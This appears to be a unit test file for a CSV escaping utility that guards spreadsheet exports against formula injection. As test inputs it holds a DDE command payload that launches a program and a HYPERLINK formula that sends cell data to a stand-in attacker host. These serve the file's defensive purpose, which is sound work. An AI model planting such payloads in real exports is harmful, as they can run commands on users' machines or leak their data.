import { escapeCsvCell, escapeCsvRow } from './csv.util';

describe('csv.util', () => {
  it('neutralises every formula trigger character', () => {
    expect(escapeCsvCell(`=cmd|'/c calc'!A1`)).toBe(`'=cmd|'/c calc'!A1`);
    expect(escapeCsvCell('+1+1')).toBe(`'+1+1`);
    expect(escapeCsvCell('-1+1')).toBe(`'-1+1`);
    expect(escapeCsvCell('@SUM(1+1)')).toBe(`'@SUM(1+1)`);
    expect(escapeCsvCell('\tcmd')).toBe(`'\tcmd`);
    expect(escapeCsvCell('\rcmd')).toBe(`'\rcmd`);
  });

  it('leaves ordinary text untouched', () => {
    expect(escapeCsvCell('Sukhumvit Branch')).toBe('Sukhumvit Branch');
    expect(escapeCsvCell('Walk-in')).toBe('Walk-in');
    expect(escapeCsvCell('')).toBe('');
  });

  it('does not corrupt non-string cells', () => {
    expect(escapeCsvCell(42)).toBe(42);
    expect(escapeCsvCell(-42)).toBe(-42);
    expect(escapeCsvCell(null)).toBeNull();
    expect(escapeCsvCell(undefined)).toBeUndefined();
  });

  it('escapes attacker-controlled names anywhere in an export row', () => {
    expect(
      escapeCsvRow({
        OrderID: 1,
        Branch: '=HYPERLINK("https://evil.example/?d="&A1,"Click")',
        Cashier: null,
        Customer: '@SUM(1+1)*cmd',
        NetAmount: -5,
      }),
    ).toEqual({
      OrderID: 1,
      Branch: `'=HYPERLINK("https://evil.example/?d="&A1,"Click")`,
      Cashier: null,
      Customer: `'@SUM(1+1)*cmd`,
      NetAmount: -5,
    });
  });
});
